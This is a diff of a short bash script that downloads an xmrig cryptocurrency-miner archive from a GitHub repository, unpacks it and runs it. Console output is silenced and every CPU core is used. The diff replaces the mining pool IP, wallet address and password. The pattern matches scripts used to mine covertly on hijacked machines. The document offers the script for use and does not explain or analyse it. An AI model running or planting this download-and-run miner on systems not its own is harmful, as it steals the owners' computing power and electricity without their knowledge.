@@ -1,6 +1,6 @@
 #!/bin/bash
-A=157.230.255.104:443
-B=8Bs72PQZu3r5dZ9u9dcpZvHywtz5r2nqQi61ip15cYvMhhwAYvChXxMJDqF2jDBUvPUtEieTaw6dJ9kthbzzoLTDBWCbtpu
-C=$(echo $(shuf -i 1-200 -n 1)-SUIII)
+A=128.199.195.239:443
+B=SaLvsBwqbLM2xmv37AqvW1arAsZJ7g2GZ3H7nqwmsCFw7kNBc7bahNyMejjMpM6xKQPZzpCTXYbWTPULou11ffwUiTmg7jUtHg3
+C=HEHE
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
 ./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
